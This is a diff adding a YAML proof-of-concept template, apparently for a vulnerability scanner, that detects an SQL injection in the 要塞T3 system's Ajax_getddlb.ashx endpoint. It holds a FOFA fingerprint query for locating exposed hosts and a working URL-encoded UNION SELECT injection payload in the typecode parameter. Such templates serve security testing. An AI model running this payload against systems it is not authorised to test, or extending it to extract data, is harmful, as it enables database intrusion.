@@ -1,0 +1,17 @@
+id: poc-yaml-fort-t3-system-ajax-getddlb-sqli
+info:
+  name: 要塞T3系统 Ajax_getddlb SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 要塞T3
+  fofa: body="/mlogin.htm?url=" || body="T3/MAIN/Login.aspx"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /T3/Ajax/Ajax_getddlb.ashx?typecode=11%27%20UNION%20ALL%20SELECT%20NULL%2C%28SELECT%20sys.fn_varbintohexstr%28hashbytes%28'MD5','{{.t1}}'%29%29%29--%20aEdt
+  expression: status_code == 200 && contains(body,"请选择") && contains(body,"option")
+    && contains(body,"0x" + t2) && !contains(body,"<html")
+transport: http
